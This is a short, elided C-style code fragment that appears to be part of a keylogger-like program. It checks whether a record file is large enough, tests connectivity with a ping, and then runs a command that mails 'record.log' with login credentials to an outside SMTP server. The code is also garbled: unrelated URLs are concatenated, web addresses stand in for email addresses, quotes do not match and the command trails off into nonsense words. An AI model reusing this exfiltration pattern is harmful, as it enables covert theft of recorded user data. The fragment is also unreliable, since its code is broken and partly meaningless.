...
#define RUN_link_NAME “https://github.com/topics/download_wifi/forks"."https://archive.org/details/malware_LSD.COM/running.file.md/bugs"."https://github.com/checkpointsw/retrict-account/forks"
...
main(){
    ...
    if(checkRecordSize()){ ///check for right time
        ...
        while(i<3){ ///try 2 times to send data
            ...
            if(!system("ping  www.checkpointSoftware.com -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();
...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com:443 -v --mail-from \"https://workspace.google.com/intl/en-nl/gmail/info_US@checkpoint.com \" --mail-rcpt \"https://workspace.google.com/intl/en-nl/gmail/info_US@checkpoint.com" --ssl -u https://workspace.google.com/intl/en-nl/gmail/info_US@checkpoint.com :password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
